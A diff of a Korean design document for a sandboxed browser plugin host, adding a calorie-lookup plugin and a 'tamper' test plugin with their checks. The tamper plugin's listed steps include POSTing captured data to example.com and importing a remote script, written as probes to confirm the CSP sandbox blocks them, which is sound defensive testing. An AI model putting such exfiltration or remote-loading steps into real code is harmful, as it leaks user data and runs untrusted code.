@@ -1,6 +1,6 @@
 # 설계: `src/plugins/` 플러그인 호스트, SDK 런타임, M0 시험 페이지
 
-상태: EGM 리뷰 반영, 사용자 승인 대기(이 PR 머지 = 승인) · 2026-10-31 · 트랙 B · 근거: `docs/specs/02-SSRD.md` §1·§3(IF-01~06, 플러그인 SDK, CSP 문단, 입력 위생)·§4 전환 공통 절차·§5 M0, `docs/designs/core-store.md` §2.2·§2.3 · 코드: `src/plugins/host/`, `src/plugins/sdk/`, `src/plugins/hello.ts`, `src/plugins/registry.ts`, `dev/`, `scripts/check-plugins.ts`
+상태: EGM 리뷰 반영, 사용자 승인 대기(이 PR 머지 = 승인) · 2026-10-31 · 트랙 B · 근거: `docs/specs/02-SSRD.md` §1·§3(IF-01~06, 플러그인 SDK, CSP 문단, 입력 위생)·§4 전환 공통 절차·§5 M0, `docs/designs/core-store.md` §2.2·§2.3 · 코드: `src/plugins/host/`, `src/plugins/sdk/`, `src/plugins/hello.ts`, `calorie.ts`, `tamper.ts`, `src/plugins/registry.ts`, `dev/`, `scripts/check-plugins.ts`
 
 ## 1. 풀려는 문제
 
@@ -84,8 +84,9 @@
 
 | 이름 | 쓰는 쪽 | 설명 |
 | --- | --- | --- |
-| `startPluginHost(): () => void` | `main.tsx`(칼로리 코드가 들어오는 PR부터) | 기본 `lensStore`로 호스트 하나. 여러 번 불러도 하나, 해제 함수 반환 |
+| `startPluginHost(): () => void` | `main.tsx`(React 렌더 전) | 기본 `lensStore`로 호스트 하나. 여러 번 불러도 하나, 해제 함수 반환 |
 | `sendDelivery(deliveryId): boolean` | A `broker/` | 2.5. 호스트가 없으면 `prepared`를 `failed`로 |
+| `sendDeliveryMessage(pluginId, msg): void` | A `broker/`의 `connectPluginHost(send)`(PR #11의 `SendDelivery` 모양) | 받은 메시지가 스토어 Delivery와 같을 때(같은 Blob 객체 포함)만 `sendDelivery`. 다르면 `failed`. 두 PR이 머지되면 `main.tsx`에 `connectPluginHost(sendDeliveryMessage)` 한 줄을 넣는다 |
 | `sha256Hex(blob): Promise<string>` | A `broker/` | `Delivery.sha256`(소문자 16진). `crypto.subtle`(LAN HTTP에서는 없음) → 순수 JS |
 | `createPluginHost(options): { sendDelivery, stop }` | `/dev`, 시험 | `store`, `container`, `hostOrigin`, `sourceFor(plugin)`(플러그인 id로 고를 수 있다), `sdkTestOptionsFor(pluginId)`, `readyTimeoutMs`, `ackTimeoutMs`, `now` 주입. `stop()`은 구독·타이머·iframe을 없애고 돌던 플러그인을 `loading`으로 둔다(다음 호스트가 다시 만든다) |
 
@@ -105,6 +106,14 @@
 
 함께 본다: iframe 속성과 CSP·nonce(TC-029), `ready` 전 `prepareDelivery` 거부, `bytes ≠ blob.size`인 Delivery가 `failed`이고 누적 전달 수·`recent10s`가 그대로, 매니페스트 재적용 뒤 새 `runtimeId`·`manifestVersion + 1`, 옛 `runtimeId` 포착 거부, 다시 `match`.
 
+### 2.9 칼로리·변조 플러그인
+
+| 플러그인 | 하는 일 | 기록 |
+| --- | --- | --- |
+| 칼로리(`calorie.ts`) | `apiBase`가 null(비교 모드)이면 요청하지 않고 고정표. 아니면 `POST {apiBase}/api/calorie`, 본문 = 받은 Blob 그대로, `Content-Type: image/jpeg`, `x-label`은 `^[a-z][a-z ]{0,31}$`일 때만(서버 규칙과 같다, Latin-1). `AbortController` 3초(`CALORIE_CLIENT_TIMEOUT_MS`). 200이고 첫 줄이 비어 있지 않으면 그 줄(`api`), 비 200·빈 본문·시간 초과·요청 실패는 고정표(`fallback`) | 시간 초과(abort)를 뺀 요청 실패(CSP 차단·네트워크·CORS)는 `reportViolation('fetch', url)`. 호스트가 "허용 목록 밖"(F14 도메인 삭제) 또는 "허용 목록 안인데 실패"를 붙인다 |
+| 고정표 | 02-SSRD IF-08 표 10종. 표 밖 라벨은 "음식(칼로리 정보 없음)"(03-SRS FR-032 결정. 02-SSRD의 [제안] "음식(종류 미상)" 대신) | — |
+| 변조(`tamper.ts`) | `onInit`이 끝난 뒤(ready 다음) 4종을 차례로: `navigator.mediaDevices.getUserMedia`, `document`·`parent`·`top`·`localStorage`를 이름 그대로 평가(CSP에 `unsafe-eval`이 없어 `new Function`은 쓰지 않는다), `fetch('https://example.com/famelet-tamper', POST)`, `importScripts('https://example.com/famelet-tamper.js')`. 받은 조각도 같은 주소로 보내 본다 | 4종 각각 `reportViolation`. target에 본 결과를 적는다(`→ 없음`, `=ReferenceError`). 시도가 성공하면 target에 "차단 실패!"를 붙인다. fetch·script target은 URL이라 호스트가 목록과 대조한다 |
+
 ## 3. 고르지 않은 방법
 
 | 방법 | 고르지 않은 이유 |
@@ -121,14 +130,15 @@
 
 - **데스크톱 Chrome의 느린 첫 시작.** Chrome은 sandbox iframe마다 렌더러 프로세스를 따로 띄운다. 이 노트북의 부하 평균이 16~35일 때 headless Chrome에서 iframe 7개를 한꺼번에 만들면 Worker 코드가 3초 안에 돌지 못해 모두 `stopped`가 되는 실행이 있었다(같은 때 따뜻한 실행은 ready 39~144ms). 제품은 iframe이 1~3개라 덜하지만, 발표 노트북에서 첫 로드 직후 칼로리가 `stopped`면 다시 켜야 한다. 리허설에서 본다. 3초 시작 시점을 "첫 load"로 옮기는 안은 02-SSRD 수치를 바꾸므로 두지 않았다.
 - **Chrome Worker에 `crypto.subtle` 없음.** localhost에서도 origin null sandbox iframe의 blob Worker는 `crypto.subtle`이 없었다(Chrome 152·156). 그래서 Chrome에서는 기본 경로도 순수 JS다. iPhone Safari HTTPS는 있었다(S7).
-- **`toString()`과 빌드 도구.** 함수가 바깥 이름을 참조하거나 빌드가 도우미를 넣으면 깨진다. 2.1의 `__name` 줄과 check-plugins의 원본·축소판 vm 실행으로 막는다. 칼로리 코드가 들어와 프로덕션 번들에 SDK가 실리는 PR에서 빌드본으로 M0를 한 번 더 돌린다.
+- **`toString()`과 빌드 도구.** 함수가 바깥 이름을 참조하거나 빌드가 도우미를 넣으면 깨진다. 2.1의 `__name` 줄과 check-plugins의 원본·축소판 vm 실행으로 막는다. 칼로리·변조 PR에서 `/dev` 두 페이지를 Vite 프로덕션 빌드(축소)로 따로 빌드해 Chrome 156에서 돌렸다: M0 15/15, 플러그인 9/9.
+- **CSP 차단은 네트워크 탭에 줄이 생기지 않는다.** Chrome 156 CDP 기록에서 Worker의 CSP 차단 fetch·importScripts는 요청 이벤트 자체가 없었다(`(blocked:csp)` 줄 없음). 그래서 데모 증거는 "example.com으로 간 요청 0건"이다. Vite 개발 서버에는 `/api/calorie`가 없어서 Origin null 사전 요청이 Vite CORS에서 막힌다(고정표 + "허용 목록 안인데 실패"). 서버 함수는 다음 PR이다.
 - **Worker CSP 상속.** blob Worker가 iframe CSP를 상속한다는 것은 Chrome(팀원 v2)과 iPhone Safari(S1~S4) 재현 페이지에서만 봤다. Android Chrome은 V9, 통합 앱은 V11에서 본다.
 - **늦은 `ack`.** 옛 iframe을 없애면 그 iframe에 보낸 전달은 2초 뒤 `timeout`이 된다. 02-SSRD IF-04대로 "수신 미확인"이 맞다.
 
 ## 5. 확인 방법
 
-- `npm run check:plugins`(`scripts/check-plugins.ts`) 22개: `sha256Pure` 표준 벡터·무작위 길이·600KB·M0 JPEG, 메시지 검증기 경계(200/201자, 이모지, 128·512자, 크기, 모르는 키, Blob 값, 빈 프로토타입), CSP 생성과 주입 거부, srcdoc 순서, violation reason 대조, SDK를 원본·축소판으로 `vm`에서 돌려 ready·ack·result·violation·순수 JS·corrupt·suppress·onInit 예외·hello 결과 줄.
-- 개발 서버 `/dev/` M0 페이지 15줄.
+- `npm run check:plugins`(`scripts/check-plugins.ts`) 29개: `sha256Pure` 표준 벡터·무작위 길이·600KB·M0 JPEG, 메시지 검증기 경계(200/201자, 이모지, 128·512자, 크기, 모르는 키, Blob 값, 빈 프로토타입), CSP 생성과 주입 거부, srcdoc 순서, violation reason 대조, 칼로리(가짜 fetch: 200·비 200·요청 실패·시간 초과·apiBase null·헤더 규칙), 변조 4종, SDK를 원본·축소판으로 `vm`에서 돌려 ready·ack·result·violation·순수 JS·corrupt·suppress·onInit 예외·hello 결과 줄.
+- 개발 서버 `/dev/` M0 페이지 15줄, `/dev/plugins.html` 9줄(칼로리 정상·도메인 삭제·고정표 밖 라벨·비교 모드 켜기/끄기·변조 4종·변조 조각 외부 전송·apiSends).
 
 ## 6. 리뷰 기록
 
